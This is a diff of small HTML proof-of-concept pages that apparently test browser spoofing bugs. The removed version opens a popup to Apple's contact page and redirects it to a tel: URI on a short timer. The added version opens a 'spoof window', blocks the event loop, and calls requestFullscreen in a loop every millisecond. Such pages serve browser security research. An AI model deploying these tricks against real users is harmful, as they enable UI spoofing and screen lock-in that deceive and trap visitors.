@@ -1,25 +1,61 @@
-<html>
-<head>
-<title>Tel Check</title>
-</head>
-<body>
-<li>click button 40 s <button onclick="pwn40()">clickme</button> </li>
-<li>click button 4000 s <button onclick="pwn4000()">clickme</button> </li>
+<script>
+var spoofWindow;
 
-    <br>
-    
-
-    <script>
-
-var pwn40 = () => {
-win = window.open("https://www.apple.com/contact/ ", "test", "width=800 height=800");
-setTimeout("win.location = 'tel:tel:+919747 '", 40);
+function launchInPopup() {
+    window.open(location.href, "", "newWindow")
 }
 
-var pwn4000 = () => {
-win = window.open("https://www.apple.com/contact/ ", "test", "width=400 height=400");
-setTimeout("win.location = 'tel:+919747 '", 400);
+function calculatePrimes(iterations, multiplier) {
+    var primes = [];
+    for (var i = 0; i < iterations; i++) {
+        var candidate = i * (multiplier * Math.random());
+        var isPrime = true;
+        for (var c = 2; c <= Math.sqrt(candidate); ++c) {
+            if (candidate % c === 0) {
+                // not prime
+                isPrime = false;
+                break;
+            }
+        }
+        if (isPrime) {
+            primes.push(candidate);
+        }
+    }
+    return primes;
+}
+
+function blockEventLoop() {
+    calculatePrimes(20100, 10000)
+}
+
+function launchOrRefocus() {
+     spoofWindow = window.open("https://www.example.com", "spoofWindow" , "newWindow")
+}
+
+function rfs() {
+  setInterval(function(){ 
+      document.documentElement.requestFullscreen();
+    },1)
 }
 </script>
-</body>
-</html>
+
+
+<button onmousedown="launchInPopup()">
+    Launch Main Window
+  </button>
+
+<button onmousedown="launchOrRefocus()">
+    Launch Spoof Window
+  </button>
+
+  <button onclick="blockEventLoop()">
+    Block Event Loop
+  </button>
+  
+  <button onmousedown="rfs()">
+    requestFullscreen
+  </button>
+  
+  <button onmousedown="launchOrRefocus()">
+    reFocus
+</button>
